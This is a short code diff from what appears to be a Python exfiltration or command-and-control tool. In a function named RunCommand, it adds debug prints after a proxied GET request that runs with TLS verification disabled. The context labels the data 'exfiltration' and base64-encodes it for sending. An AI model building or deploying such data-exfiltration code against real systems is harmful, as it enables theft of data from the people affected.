@@ -37,7 +37,9 @@ def RunCommand():
     }
 
     response = requests.request("GET", url, headers=headers, proxies=proxies, verify=False)
-
+    print(response.status_code)
+    print(response.text)
+    
     msg = "exfiltration"
     text_to_send=base64.b64encode(text_to_send.encode("utf-8")).decode("utf-8")
     data = response.json()
